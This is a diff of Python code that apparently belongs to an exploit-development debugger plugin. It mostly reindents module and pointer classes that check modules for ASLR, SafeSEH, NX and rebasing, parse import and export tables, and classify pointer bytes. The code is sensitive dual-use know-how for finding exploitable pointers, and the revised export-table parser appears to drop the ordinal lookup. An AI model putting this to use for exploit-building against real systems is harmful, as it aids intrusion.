-        mentry = 0
-        mversion = ""
-        self.internalname = modulename
-        if modulename != "":
-            # if info is cached, retrieve from cache
-            if ModInfoCached(modulename):
-                modisaslr = getModuleProperty(modulename,"aslr")
-                modissafeseh = getModuleProperty(modulename,"safeseh")
-                modrebased = getModuleProperty(modulename,"rebase")
-                modisnx = getModuleProperty(modulename,"nx")
-                modisos = getModuleProperty(modulename,"os")
-                path = getModuleProperty(modulename,"path")
-                mzbase = getModuleProperty(modulename,"base")
-                mzsize = getModuleProperty(modulename,"size")
-                mztop = getModuleProperty(modulename,"top")
-                mversion = getModuleProperty(modulename,"version")
-                mentry = getModuleProperty(modulename,"entry")
-                mcodebase = getModuleProperty(modulename,"codebase")
-                mcodesize = getModuleProperty(modulename,"codesize")
-                mcodetop = getModuleProperty(modulename,"codetop")
-            else:
-                #gather info manually - this code should only get called from populateModuleInfo()
-                self.moduleobj = dbg.getModule(modulename)
-                modissafeseh = True
-                modisaslr = True
-                modisnx = True
-                modrebased = False
-                modisos = False
-                #if self.moduleobj == None:
-                #   dbg.log("*** Error - self.moduleobj is None, key %s" % modulename, highlight=1)
-                mod       = self.moduleobj
-                mzbase    = mod.getBaseAddress()
-                mzrebase  = mod.getFixupbase()
-                mzsize    = mod.getSize()
-                mversion  = mod.getVersion()
-                mentry    = mod.getEntry() 
-                mcodebase = mod.getCodebase()
-                mcodesize = mod.getCodesize()
-                mcodetop  = mcodebase + mcodesize
-                
-                mversion=mversion.replace(", ",".")
-                mversionfields=mversion.split('(')
-                mversion=mversionfields[0].replace(" ","")
-                                
-                if mversion=="":
-                    mversion="-1.0-"
-                path=mod.getPath()
-                if mod.getIssystemdll() == 0:
-                    modisos = "WINDOWS" in path.upper()
-                else:
-                    modisos = True
-                mztop = mzbase + mzsize
-                if mzbase > 0:
-                    peoffset=struct.unpack('<L',dbg.readMemory(mzbase+0x3c,4))[0]
-                    pebase=mzbase+peoffset
-                    osver=dbg.getOsVersion()
-                    safeseh_offset = [0x5f, 0x5f, 0x5e]
-                    safeseh_flag = [0x4, 0x4, 0x400]
-                    os_index = 0
-                    # Vista / Win7 / Win8
-                    if win7mode:
-                        os_index = 2
-                    flags=struct.unpack('<H',dbg.readMemory(pebase+safeseh_offset[os_index],2))[0]
-                    numberofentries=struct.unpack('<L',dbg.readMemory(pebase+0x74,4))[0]
-                    #safeseh ?
-                    if (flags&safeseh_flag[os_index])!=0:
-                        modissafeseh=True
-                    else:
-                        if numberofentries>10:
-                            sectionaddress,sectionsize=struct.unpack('<LL',dbg.readMemory(pebase+0x78+8*10,8))
-                            sectionaddress+=mzbase
-                            data=struct.unpack('<L',dbg.readMemory(sectionaddress,4))[0]
-                            condition = False
-                            if os_index < 2:
-                                condition=(sectionsize!=0) and ((sectionsize==0x40) or (sectionsize==data))
-                            else:
-                                condition=(sectionsize!=0) and ((sectionsize==0x40))
-                            if condition==False:
-                                modissafeseh=False
-                            else:
-                                sehlistaddress,sehlistsize=struct.unpack('<LL',dbg.readMemory(sectionaddress+0x40,8))
-                                if sehlistaddress!=0 and sehlistsize!=0:
-                                    modissafeseh=True
-                                else:
-                                    modissafeseh=False
-                
-                    #aslr
-                    if (flags&0x0040)==0:  # 'IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE
-                        modisaslr=False
-                    #nx
-                    if (flags&0x0100)==0:
-                        modisnx=False
-                    #rebase
-                    if mzrebase <> mzbase:
-                        modrebased=True
-        else:
-            # should never be hit
-            #print "No module specified !!!"
-            #print "stacktrace : "
-            #print traceback.format_exc()
-            return None
+	"""
+	Class to access module properties
+	"""
+	def __init__(self, modulename):
+		#dbg.log("MnModule(%s)" % modulename)
+		modisaslr = True
+		modissafeseh = True
+		modrebased = True
+		modisnx = True
+		modisos = True
+		self.IAT = {}
+		self.EAT = {}
+		path = ""
+		mzbase = 0
+		mzsize = 0
+		mztop = 0
+		mcodebase = 0
+		mcodesize = 0
+		mcodetop = 0
+		mentry = 0
+		mversion = ""
+		self.internalname = modulename
+		if modulename != "":
+			# if info is cached, retrieve from cache
+			if ModInfoCached(modulename):
+				modisaslr = getModuleProperty(modulename,"aslr")
+				modissafeseh = getModuleProperty(modulename,"safeseh")
+				modrebased = getModuleProperty(modulename,"rebase")
+				modisnx = getModuleProperty(modulename,"nx")
+				modisos = getModuleProperty(modulename,"os")
+				path = getModuleProperty(modulename,"path")
+				mzbase = getModuleProperty(modulename,"base")
+				mzsize = getModuleProperty(modulename,"size")
+				mztop = getModuleProperty(modulename,"top")
+				mversion = getModuleProperty(modulename,"version")
+				mentry = getModuleProperty(modulename,"entry")
+				mcodebase = getModuleProperty(modulename,"codebase")
+				mcodesize = getModuleProperty(modulename,"codesize")
+				mcodetop = getModuleProperty(modulename,"codetop")
+			else:
+				#gather info manually - this code should only get called from populateModuleInfo()
+				self.moduleobj = dbg.getModule(modulename)
+				modissafeseh = True
+				modisaslr = True
+				modisnx = True
+				modrebased = False
+				modisos = False
+				#if self.moduleobj == None:
+				#	dbg.log("*** Error - self.moduleobj is None, key %s" % modulename, highlight=1)
+				mod       = self.moduleobj
+				mzbase    = mod.getBaseAddress()
+				mzrebase  = mod.getFixupbase()
+				mzsize    = mod.getSize()
+				mversion  = mod.getVersion()
+				mentry    = mod.getEntry() 
+				mcodebase = mod.getCodebase()
+				mcodesize = mod.getCodesize()
+				mcodetop  = mcodebase + mcodesize
+				
+				mversion=mversion.replace(", ",".")
+				mversionfields=mversion.split('(')
+				mversion=mversionfields[0].replace(" ","")
+								
+				if mversion=="":
+					mversion="-1.0-"
+				path=mod.getPath()
+				if mod.getIssystemdll() == 0:
+					modisos = "WINDOWS" in path.upper()
+				else:
+					modisos = True
+				mztop = mzbase + mzsize
+				if mzbase > 0:
+					peoffset=struct.unpack('<L',dbg.readMemory(mzbase+0x3c,4))[0]
+					pebase=mzbase+peoffset
+					osver=dbg.getOsVersion()
+					safeseh_offset = [0x5f, 0x5f, 0x5e]
+					safeseh_flag = [0x4, 0x4, 0x400]
+					os_index = 0
+					# Vista / Win7 / Win8
+					if win7mode:
+						os_index = 2
+					flags=struct.unpack('<H',dbg.readMemory(pebase+safeseh_offset[os_index],2))[0]
+					numberofentries=struct.unpack('<L',dbg.readMemory(pebase+0x74,4))[0]
+					#safeseh ?
+					if (flags&safeseh_flag[os_index])!=0:
+						modissafeseh=True
+					else:
+						if numberofentries>10:
+							sectionaddress,sectionsize=struct.unpack('<LL',dbg.readMemory(pebase+0x78+8*10,8))
+							sectionaddress+=mzbase
+							data=struct.unpack('<L',dbg.readMemory(sectionaddress,4))[0]
+							condition = False
+							if os_index < 2:
+								condition=(sectionsize!=0) and ((sectionsize==0x40) or (sectionsize==data))
+							else:
+								condition=(sectionsize!=0) and ((sectionsize==0x40))
+							if condition==False:
+								modissafeseh=False
+							else:
+								sehlistaddress,sehlistsize=struct.unpack('<LL',dbg.readMemory(sectionaddress+0x40,8))
+								if sehlistaddress!=0 and sehlistsize!=0:
+									modissafeseh=True
+								else:
+									modissafeseh=False
+				
+					#aslr
+					if (flags&0x0040)==0:  # 'IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE
+						modisaslr=False
+					#nx
+					if (flags&0x0100)==0:
+						modisnx=False
+					#rebase
+					if mzrebase != mzbase:
+						modrebased=True
+		else:
+			# should never be hit
+			#print "No module specified !!!"
+			#print "stacktrace : "
+			#print traceback.format_exc()
+			return None
 
         #check if module is excluded
         thisconfig = MnConfig()
@@ -2790,207 +2835,214 @@ class MnModule:
         Arguments:
         None
 
-        Return:
-        String with various properties about a module
-        """         
-        outstring = ""
-        if self.moduleKey != "":
-            outstring = "[" + self.moduleKey + "] ASLR: " + str(self.isAslr) + ", Rebase: " + str(self.isRebase) + ", SafeSEH: " + str(self.isSafeSEH) + ", OS: " + str(self.isOS) + ", v" + self.moduleVersion + " (" + self.modulePath + ")"
-        else:
-            outstring = "[None]"
-        return outstring
-        
-    def isAslr(self):
-        return self.isAslr
-        
-    def isSafeSEH(self):
-        return self.isSafeSEH
-        
-    def isRebase(self):
-        return self.isRebase
-        
-    def isOS(self):
-        return self.isOS
-    
-    def isNX(self):
-        return self.isNX
-        
-    def moduleKey(self):
-        return self.moduleKey
-        
-    def modulePath(self):
-        return self.modulePath
-    
-    def moduleBase(self):
-        return self.moduleBase
-    
-    def moduleSize(self):
-        return self.moduleSize
-    
-    def moduleTop(self):
-        return self.moduleTop
-    
-    def moduleEntry(self):
-        return self.moduleEntry
-        
-    def moduleCodebase(self):
-        return self.moduleCodebase
-    
-    def moduleCodesize(self):
-        return self.moduleCodesize
-        
-    def moduleCodetop(self):
-        return self.moduleCodetop
-        
-    def moduleVersion(self):
-        return self.moduleVersion
-        
-    def isExcluded(self):
-        return self.isExcluded
-    
-    def getFunctionCalls(self,criteria={}):
-        funccalls = {}
-        sequences = []
-        sequences.append(["call","\xff\x15"])
-        funccalls = searchInRange(sequences, self.moduleBase, self.moduleTop,criteria)
-        return funccalls
-        
-    def getIAT(self):
-        IAT = {}
-        try:
-            if len(self.IAT) == 0:
-                themod = dbg.getModule(self.moduleKey)
-                syms = themod.getSymbols()
-                thename = ""
-                for sym in syms:
-                    if syms[sym].getType().startswith("Import"):
-                        thename = syms[sym].getName()
-                        theaddress = syms[sym].getAddress()
-                        if not theaddress in IAT:
-                            IAT[theaddress] = thename
-                
-                # merge
-                
-                # find optional header
-                PEHeader_ref = self.moduleBase + 0x3c
-                PEHeader_location = self.moduleBase + struct.unpack('<L',dbg.readMemory(PEHeader_ref,4))[0]
-                # do we have an optional header ?
-                bsizeOfOptionalHeader = dbg.readMemory(PEHeader_location+0x14,2)
-                sizeOfOptionalHeader = struct.unpack('<L',bsizeOfOptionalHeader+"\x00\x00")[0]
-                OptionalHeader_location = PEHeader_location + 0x18
-                if sizeOfOptionalHeader > 0:
-                    # get address of DataDirectory
-                    DataDirectory_location = OptionalHeader_location + 0x60
-                    # get size of Import Table
-                    importtable_size = struct.unpack('<L',dbg.readMemory(DataDirectory_location+0x64,4) )[0]
-                    importtable_rva = struct.unpack('<L',dbg.readMemory(DataDirectory_location+0x60,4) )[0]
-                    iatAddr = self.moduleBase + importtable_rva
-                    max_nr_entries = importtable_size / 4
-                    iatcnt = 0
-                    while iatcnt < max_nr_entries:
-                        thisloc = iatAddr + (4*iatcnt)
-                        iatEntry = struct.unpack('<L',dbg.readMemory(thisloc,4) )[0]
-                        if iatEntry > 0:
-                            ptr = iatEntry
-                            ptrx = MnPointer(iatEntry)
-                            modname = ptrx.belongsTo()
-                            tmod = MnModule(modname)
-                            thisfunc = dbglib.Function(dbg,ptr)
-                            thisfuncfullname = thisfunc.getName().lower()
-                            if thisfuncfullname.endswith(".unknown") or thisfuncfullname.endswith(".%08x" % ptr):
-                                if not tmod is None:
-                                    imagename = tmod.getShortName()
-                                    eatlist = tmod.getEAT()
-                                    if iatEntry in eatlist:
-                                        thisfuncfullname =  "." + imagename + "!" + eatlist[iatEntry]   
-                                        thisfuncname = thisfuncfullname.split('.')
-                                        IAT[thisloc] = thisfuncname[1].strip(">")
-                                    else:
-                                        IAT[thisloc] = imagename + "!0x%08x" % iatEntry
-                            else:   
-                                IAT[thisloc] = thisfuncfullname.replace(".","!")
-                        iatcnt += 1
-                
-                if len(IAT) == 0:
-                    #search method nr 2, not accurate, but will find *something*
-                    funccalls = self.getFunctionCalls()
-                    for functype in funccalls:
-                        for fptr in funccalls[functype]:
-                            ptr=struct.unpack('<L',dbg.readMemory(fptr+2,4))[0]
-                            if ptr >= self.moduleBase and ptr <= self.moduleTop:
-                                if not ptr in IAT:
-                                    thisfunc = dbglib.Function(dbg,ptr)
-                                    thisfuncfullname = thisfunc.getName().lower()
-                                    thisfuncname = []
-                                    if thisfuncfullname.endswith(".unknown") or thisfuncfullname.endswith(".%08x" % ptr):
-                                        iatptr = struct.unpack('<L',dbg.readMemory(ptr,4))[0]
-                                        # see if we can find the original function name using the EAT
-                                        tptr = MnPointer(ptr)
-                                        modname = tptr.belongsTo()
-                                        tmod = MnModule(modname)
-                                        ofullname = thisfuncfullname
-                                        
-                                        if not tmod is None:
-                                            imagename = tmod.getShortName()
-                                            eatlist = tmod.getEAT()
-                                            if iatptr in eatlist:
-                                                thisfuncfullname =  "." + imagename + "!" + eatlist[iatptr]
-                                        if thisfuncfullname == ofullname:
-                                            tparts = thisfuncfullname.split('.')
-                                            thisfuncfullname = tparts[0] + (".%08x" % iatptr)
-                                    thisfuncname = thisfuncfullname.split('.')
-                                    IAT[ptr] = thisfuncname[1].strip(">")
-                                    
-                self.IAT = IAT
-            else:
-                IAT = self.IAT
-        except:
-            import traceback
-            dbg.logLines(traceback.format_exc())
-            return IAT
-        return IAT
-        
-        
-    def getEAT(self):
-        eatlist = {}
-        if len(self.EAT) == 0:
-            try:
-                # avoid major suckage, let's do it ourselves
-                # find optional header
-                PEHeader_ref = self.moduleBase + 0x3c
-                PEHeader_location = self.moduleBase + struct.unpack('<L',dbg.readMemory(PEHeader_ref,4))[0]
-                # do we have an optional header ?
-                bsizeOfOptionalHeader = dbg.readMemory(PEHeader_location+0x14,2)
-                sizeOfOptionalHeader = struct.unpack('<L',bsizeOfOptionalHeader+"\x00\x00")[0]
-                OptionalHeader_location = PEHeader_location + 0x18
-                if sizeOfOptionalHeader > 0:
-                    # get address of DataDirectory
-                    DataDirectory_location = OptionalHeader_location + 0x60
-                    # get size of Export Table
-                    exporttable_size = struct.unpack('<L',dbg.readMemory(DataDirectory_location+4,4) )[0]
-                    exporttable_rva = struct.unpack('<L',dbg.readMemory(DataDirectory_location,4) )[0]
-                    if exporttable_size > 0:
-                        # get start of export table
-                        eatAddr = self.moduleBase + exporttable_rva
-                        nr_of_names = struct.unpack('<L',dbg.readMemory(eatAddr + 0x18,4))[0]
-                        rva_of_names = self.moduleBase + struct.unpack('<L',dbg.readMemory(eatAddr + 0x20,4))[0]
-                        address_of_functions =  self.moduleBase + struct.unpack('<L',dbg.readMemory(eatAddr + 0x1c,4))[0]
-                        address_of_ordinals =  self.moduleBase + struct.unpack('<L',dbg.readMemory(eatAddr + 0x24,4))[0]
-                        for i in range(0, nr_of_names):
-                            eatName = dbg.readString(self.moduleBase + struct.unpack('<L',dbg.readMemory(rva_of_names + (4 * i),4))[0])
-                            ordinal_val = struct.unpack('<H',dbg.readMemory(address_of_ordinals + (2 * i),2))[0]
-                            eatAddress = self.moduleBase + struct.unpack('<L',dbg.readMemory(address_of_functions + (4 * ordinal_val),4))[0]
-                            eatlist[eatAddress] = eatName
-                self.EAT = eatlist
-            except:
-                return eatlist
-        else:
-            eatlist = self.EAT
-        return eatlist
-    
-    
-    def getShortName(self):
-        return stripExtension(self.moduleKey)
+		Return:
+		String with various properties about a module
+		"""			
+		outstring = ""
+		if self.moduleKey != "":
+			outstring = "[" + self.moduleKey + "] ASLR: " + str(self.isAslr) + ", Rebase: " + str(self.isRebase) + ", SafeSEH: " + str(self.isSafeSEH) + ", OS: " + str(self.isOS) + ", v" + self.moduleVersion + " (" + self.modulePath + ")"
+		else:
+			outstring = "[None]"
+		return outstring
+		
+	def isAslr(self):
+		return self.isAslr
+		
+	def isSafeSEH(self):
+		return self.isSafeSEH
+		
+	def isRebase(self):
+		return self.isRebase
+		
+	def isOS(self):
+		return self.isOS
+	
+	def isNX(self):
+		return self.isNX
+		
+	def moduleKey(self):
+		return self.moduleKey
+		
+	def modulePath(self):
+		return self.modulePath
+	
+	def moduleBase(self):
+		return self.moduleBase
+	
+	def moduleSize(self):
+		return self.moduleSize
+	
+	def moduleTop(self):
+		return self.moduleTop
+	
+	def moduleEntry(self):
+		return self.moduleEntry
+		
+	def moduleCodebase(self):
+		return self.moduleCodebase
+	
+	def moduleCodesize(self):
+		return self.moduleCodesize
+		
+	def moduleCodetop(self):
+		return self.moduleCodetop
+		
+	def moduleVersion(self):
+		return self.moduleVersion
+		
+	def isExcluded(self):
+		return self.isExcluded
+	
+	def getFunctionCalls(self,criteria={}):
+		funccalls = {}
+		sequences = []
+		sequences.append(["call","\xff\x15"])
+		funccalls = searchInRange(sequences, self.moduleBase, self.moduleTop,criteria)
+		return funccalls
+		
+	def getIAT(self):
+		IAT = {}
+		global IATCache
+		dbg.logLines("    Getting IAT for %s." % (self.moduleKey))
+		try:
+			if not self.moduleKey in IATCache:  # if len(self.IAT) == 0:
+				dbg.log("    Enumerating IAT")          
+				try:
+					themod = dbg.getModule(self.moduleKey)
+					syms = themod.getSymbols()
+					thename = ""
+					for sym in syms:
+						if syms[sym].getType().startswith("Import"):
+							thename = syms[sym].getName()
+							theaddress = syms[sym].getAddress()
+							if not theaddress in IAT:
+								IAT[theaddress] = thename
+				except:
+					import traceback
+					dbg.logLines(traceback.format_exc())
+					pass
+				# merge
+				
+				# find optional header
+				PEHeader_ref = self.moduleBase + 0x3c
+				PEHeader_location = self.moduleBase + struct.unpack('<L',dbg.readMemory(PEHeader_ref,4))[0]
+				# do we have an optional header ?
+				bsizeOfOptionalHeader = dbg.readMemory(PEHeader_location+0x14,2)
+				sizeOfOptionalHeader = struct.unpack('<L',bsizeOfOptionalHeader+"\x00\x00")[0]
+				OptionalHeader_location = PEHeader_location + 0x18
+				if sizeOfOptionalHeader > 0:
+					# get address of DataDirectory
+					DataDirectory_location = OptionalHeader_location + 0x60
+					# get size of Import Table
+					importtable_size = struct.unpack('<L',dbg.readMemory(DataDirectory_location+0x64,4) )[0]
+					importtable_rva = struct.unpack('<L',dbg.readMemory(DataDirectory_location+0x60,4) )[0]
+					iatAddr = self.moduleBase + importtable_rva
+					max_nr_entries = importtable_size / 4
+					iatcnt = 0
+					while iatcnt < max_nr_entries:
+						thisloc = iatAddr + (4*iatcnt)
+						iatEntry = struct.unpack('<L',dbg.readMemory(thisloc,4) )[0]
+						if iatEntry > 0:
+							ptr = iatEntry
+							ptrx = MnPointer(iatEntry)
+							modname = ptrx.belongsTo()
+							tmod = MnModule(modname)
+							thisfunc = dbglib.Function(dbg,ptr)
+							thisfuncfullname = thisfunc.getName().lower()
+							if thisfuncfullname.endswith(".unknown") or thisfuncfullname.endswith(".%08x" % ptr):
+								if not tmod is None:
+									imagename = tmod.getShortName()
+									eatlist = tmod.getEAT()
+									if iatEntry in eatlist:
+										thisfuncfullname =  "." + imagename + "!" + eatlist[iatEntry]	
+										thisfuncname = thisfuncfullname.split('.')
+										IAT[thisloc] = thisfuncname[1].strip(">")
+									else:
+										IAT[thisloc] = imagename + "!0x%08x" % iatEntry
+							else:	
+								IAT[thisloc] = thisfuncfullname.replace(".","!")
+						iatcnt += 1
+				
+				if len(IAT) == 0:
+					#search method nr 2, not accurate, but will find *something*
+					funccalls = self.getFunctionCalls()
+					for functype in funccalls:
+						for fptr in funccalls[functype]:
+							ptr=struct.unpack('<L',dbg.readMemory(fptr+2,4))[0]
+							if ptr >= self.moduleBase and ptr <= self.moduleTop:
+								if not ptr in IAT:
+									thisfunc = dbglib.Function(dbg,ptr)
+									thisfuncfullname = thisfunc.getName().lower()
+									thisfuncname = []
+									if thisfuncfullname.endswith(".unknown") or thisfuncfullname.endswith(".%08x" % ptr):
+										iatptr = struct.unpack('<L',dbg.readMemory(ptr,4))[0]
+										# see if we can find the original function name using the EAT
+										tptr = MnPointer(ptr)
+										modname = tptr.belongsTo()
+										tmod = MnModule(modname)
+										ofullname = thisfuncfullname
+										
+										if not tmod is None:
+											imagename = tmod.getShortName()
+											eatlist = tmod.getEAT()
+											if iatptr in eatlist:
+												thisfuncfullname =  "." + imagename + "!" + eatlist[iatptr]
+										if thisfuncfullname == ofullname:
+											tparts = thisfuncfullname.split('.')
+											thisfuncfullname = tparts[0] + (".%08x" % iatptr)
+									thisfuncname = thisfuncfullname.split('.')
+									IAT[ptr] = thisfuncname[1].strip(">")
+									
+				self.IAT = IAT
+				IATCache[self.moduleKey] = IAT
+			else:
+				dbg.log("    Retrieving IAT from cache")             
+				IAT = IATCache[self.moduleKey] #IAT = self.IAT
+		except:
+			import traceback
+			dbg.logLines(traceback.format_exc())
+			return IAT
+		return IAT
+		
+		
+	def getEAT(self):
+		eatlist = {}
+		if len(self.EAT) == 0:
+			try:
+				# avoid major suckage, let's do it ourselves
+				# find optional header
+				PEHeader_ref = self.moduleBase + 0x3c
+				PEHeader_location = self.moduleBase + struct.unpack('<L',dbg.readMemory(PEHeader_ref,4))[0]
+				# do we have an optional header ?
+				bsizeOfOptionalHeader = dbg.readMemory(PEHeader_location+0x14,2)
+				sizeOfOptionalHeader = struct.unpack('<L',bsizeOfOptionalHeader+"\x00\x00")[0]
+				OptionalHeader_location = PEHeader_location + 0x18
+				if sizeOfOptionalHeader > 0:
+					# get address of DataDirectory
+					DataDirectory_location = OptionalHeader_location + 0x60
+					# get size of Export Table
+					exporttable_size = struct.unpack('<L',dbg.readMemory(DataDirectory_location+4,4) )[0]
+					exporttable_rva = struct.unpack('<L',dbg.readMemory(DataDirectory_location,4) )[0]
+					if exporttable_size > 0:
+						# get start of export table
+						eatAddr = self.moduleBase + exporttable_rva
+						nr_of_names = struct.unpack('<L',dbg.readMemory(eatAddr + 0x18,4))[0]
+						rva_of_names = self.moduleBase + struct.unpack('<L',dbg.readMemory(eatAddr + 0x20,4))[0]
+						address_of_functions =  self.moduleBase + struct.unpack('<L',dbg.readMemory(eatAddr + 0x1c,4))[0]
+						for i in range(0, nr_of_names):
+							eatName = dbg.readString(self.moduleBase + struct.unpack('<L',dbg.readMemory(rva_of_names + (4 * i),4))[0])
+							eatAddress = self.moduleBase + struct.unpack('<L',dbg.readMemory(address_of_functions + (4 * i),4))[0]
+							eatlist[eatAddress] = eatName
+				self.EAT = eatlist
+			except:
+				return eatlist
+		else:
+			eatlist = self.EAT
+		return eatlist
+	
+	
+	def getShortName(self):
+		return stripExtension(self.moduleKey)
 
 
 def getNtGlobalFlag():
@@ -3944,987 +3996,1000 @@ class MnChunk:
 #  Class to access pointer properties   #
 #---------------------------------------#
 class MnPointer:
-    """
-    Class to access pointer properties
-    """
-    def __init__(self,address):
-    
-        # check that the address is an integer
-        if not type(address) == int and not type(address) == long:
-            raise Exception("address should be an integer or long")
-    
-        self.address = address
-        
-        NullRange           = [0]
-        AsciiRange          = range(1,128)
-        AsciiPrintRange     = range(20,127)
-        AsciiUppercaseRange = range(65,91)
-        AsciiLowercaseRange = range(97,123)
-        AsciiAlphaRange     = AsciiUppercaseRange + AsciiLowercaseRange
-        AsciiNumericRange   = range(48,58)
-        AsciiSpaceRange     = [32]
-        
-        self.HexAddress = toHex(address)
-
-        # define the characteristics of the pointer
-        byte1,byte2,byte3,byte4,byte5,byte6,byte7,byte8 = (0,)*8
-
-        if arch == 32:
-            byte1,byte2,byte3,byte4 = splitAddress(address)
-        elif arch == 64:
-            byte1,byte2,byte3,byte4,byte5,byte6,byte7,byte8 = splitAddress(address)
-        
-        # Nulls
-        self.hasNulls = (byte1 == 0) or (byte2 == 0) or (byte3 == 0) or (byte4 == 0)
-        
-        # Starts with null
-        self.startsWithNull = (byte1 == 0)
-        
-        # Unicode
-        self.isUnicode = ((byte1 == 0) and (byte3 == 0))
-        
-        # Unicode reversed
-        self.isUnicodeRev = ((byte2 == 0) and (byte4 == 0))
-
-        if arch == 64:
-            self.hasNulls = self.hasNulls or (byte5 == 0) or (byte6 == 0) or (byte7 == 0) or (byte8 == 0)
-            self.isUnicode = self.isUnicode and ((byte5 == 0) and (byte7 == 0))
-            self.isUnicodeRev = self.isUnicodeRev and ((byte6 == 0) and (byte8 == 0))
-        
-        # Unicode transform
-        self.unicodeTransform = UnicodeTransformInfo(self.HexAddress) 
-
-        # Ascii
-        if not self.isUnicode and not self.isUnicodeRev:            
-            self.isAscii = bytesInRange(address, AsciiRange)
-        else:
-            self.isAscii = bytesInRange(address, NullRange + AsciiRange)
-        
-        # AsciiPrintable
-        if not self.isUnicode and not self.isUnicodeRev:
-            self.isAsciiPrintable = bytesInRange(address, AsciiPrintRange)
-        else:
-            self.isAsciiPrintable = bytesInRange(address, NullRange + AsciiPrintRange)
-            
-        # Uppercase
-        if not self.isUnicode and not self.isUnicodeRev:
-            self.isUppercase = bytesInRange(address, AsciiUppercaseRange)
-        else:
-            self.isUppercase = bytesInRange(address, NullRange + AsciiUppercaseRange)
-        
-        # Lowercase
-        if not self.isUnicode and not self.isUnicodeRev:
-            self.isLowercase = bytesInRange(address, AsciiLowercaseRange)
-        else:
-            self.isLowercase = bytesInRange(address, NullRange + AsciiLowercaseRange)
-            
-        # Numeric
-        if not self.isUnicode and not self.isUnicodeRev:
-            self.isNumeric = bytesInRange(address, AsciiNumericRange)
-        else:
-            self.isNumeric = bytesInRange(address, NullRange + AsciiNumericRange)
-            
-        # Alpha numeric
-        if not self.isUnicode and not self.isUnicodeRev:
-            self.isAlphaNumeric = bytesInRange(address, AsciiAlphaRange + AsciiNumericRange + AsciiSpaceRange)
-        else:
-            self.isAlphaNumeric = bytesInRange(address, NullRange + AsciiAlphaRange + AsciiNumericRange + AsciiSpaceRange)
-        
-        # Uppercase + Numbers
-        if not self.isUnicode and not self.isUnicodeRev:
-            self.isUpperNum = bytesInRange(address, AsciiUppercaseRange + AsciiNumericRange)
-        else:
-            self.isUpperNum = bytesInRange(address, NullRange + AsciiUppercaseRange + AsciiNumericRange)
-        
-        # Lowercase + Numbers
-        if not self.isUnicode and not self.isUnicodeRev:
-            self.isLowerNum = bytesInRange(address, AsciiLowercaseRange + AsciiNumericRange)
-        else:
-            self.isLowerNum = bytesInRange(address, NullRange + AsciiLowercaseRange + AsciiNumericRange)
-        
-    
-    def __str__(self):
-        """
-        Get pointer properties (human readable format)
-
-        Arguments:
-        None
-
-        Return:
-        String with various properties about the pointer
-        """ 
-
-        outstring = ""
-        if self.startsWithNull:
-            outstring += "startnull,"
-            
-        elif self.hasNulls:
-            outstring += "null,"
-        
-        #check if this pointer is unicode transform
-        hexaddr = self.HexAddress
-        outstring += UnicodeTransformInfo(hexaddr)
-
-        if self.isUnicode:
-            outstring += "unicode,"
-        if self.isUnicodeRev:
-            outstring += "unicodereverse,"          
-        if self.isAsciiPrintable:
-            outstring += "asciiprint,"
-        if self.isAscii:
-            outstring += "ascii,"
-        if self.isUppercase:
-            outstring == "upper,"
-        if self.isLowercase:
-            outstring += "lower,"
-        if self.isNumeric:
-            outstring+= "num,"
-            
-        if self.isAlphaNumeric and not (self.isUppercase or self.isLowercase or self.isNumeric):
-            outstring += "alphanum,"
-        
-        if self.isUpperNum and not (self.isUppercase or self.isNumeric):
-            outstring += "uppernum,"
-        
-        if self.isLowerNum and not (self.isLowercase or self.isNumeric):
-            outstring += "lowernum,"
-            
-        outstring = outstring.rstrip(",")
-        outstring += " {" + getPointerAccess(self.address)+"}"
-        return outstring
-
-    def getAddress(self):
-        return self.address
-    
-    def isUnicode(self):
-        return self.isUnicode
-        
-    def isUnicodeRev(self):
-        return self.isUnicodeRev        
-    
-    def isUnicodeTransform(self):
-        return self.unicodeTransform != ""
-    
-    def isAscii(self):
-        return self.isAscii
-    
-    def isAsciiPrintable(self):
-        return self.isAsciiPrintable
-    
-    def isUppercase(self):
-        return self.isUppercase
-    
-    def isLowercase(self):
-        return self.isLowercase
-        
-    def isUpperNum(self):
-        return self.isUpperNum
-        
-    def isLowerNum(self):
-        return self.isLowerNum
-        
-    def isNumeric(self):
-        return self.isNumeric
-        
-    def isAlphaNumeric(self):
-        return self.alphaNumeric
-    
-    def hasNulls(self):
-        return self.hasNulls
-    
-    def startsWithNull(self):
-        return self.startsWithNull
-        
-    def belongsTo(self):
-        """
-        Retrieves the module a given pointer belongs to
-
-        Arguments:
-        None
-
-        Return:
-        String with the name of the module a pointer belongs to,
-        or empty if pointer does not belong to a module
-        """     
-        if len(g_modules)==0:
-            populateModuleInfo()
-        for thismodule,modproperties in g_modules.iteritems():
-                thisbase = getModuleProperty(thismodule,"base")
-                thistop = getModuleProperty(thismodule,"top")
-                if (self.address >= thisbase) and (self.address <= thistop):
-                    return thismodule
-        return ""
-    
-    def isOnStack(self):
-        """
-        Checks if the pointer is on one of the stacks of one of the threads in the process
-
-        Arguments:
-        None
-
-        Return:
-        Boolean - True if pointer is on stack
-        """ 
-        stacks = getStacks()
-        for stack in stacks:
-            if (stacks[stack][0] <= self.address) and (self.address < stacks[stack][1]):
-                return True
-        return False
-    
-    def isInHeap(self):
-        """
-        Checks if the pointer is part of one of the pages associated with process heaps/segments
-
-        Arguments:
-        None
-
-        Return:
-        Boolean - True if pointer is in heap
-        """ 
-        segmentcnt = 0
-
-        for heap in dbg.getHeapsAddress():
-                # part of a segment ?
-                segments = getSegmentsForHeap(heap)
-                for segment in segments:
-                    if segmentcnt == 0:
-                        # in heap data structure
-                        if self.address >= heap and self.address <= segment:
-                            return True
-                        segmentcnt += 1
-                    if self.address >= segment:
-                        last = segments[segment][3]
-                        if self.address >= segment and self.address <= last:
-                            return True
-        # maybe it's in a VA List ?
-        for heap in dbg.getHeapsAddress():
-            mHeap = MnHeap(heap)
-            valist = mHeap.getVirtualAllocdBlocks()
-            if len(valist) > 0:
-                for vachunk in valist:
-                    thischunk = valist[vachunk]
-                    #dbg.log("self: 0x%08x, vachunk: 0x%08x, commitsize: 0x%08x, vachunk+(thischunk.commitsize)*8: 0x%08x" % (self.address,vachunk,thischunk.commitsize,vachunk+(thischunk.commitsize*8)))
-                    if self.address >= vachunk and self.address <= (vachunk+(thischunk.commitsize*heapgranularity)):
-                        return True
-        return False
-        
-
-    def getHeapInfo(self):
-        global silent
-        oldsilent = silent
-        silent = True
-        foundinheap, foundinsegment, foundinva, foundinchunk = self.showHeapBlockInfo()
-        silent = oldsilent
-        return [foundinheap, foundinsegment, foundinva, foundinchunk]
-
-    def getHeapInfo_old(self):
-        """
-        Returns heap related information about a given pointer
-        """
-        heapinfo = {}
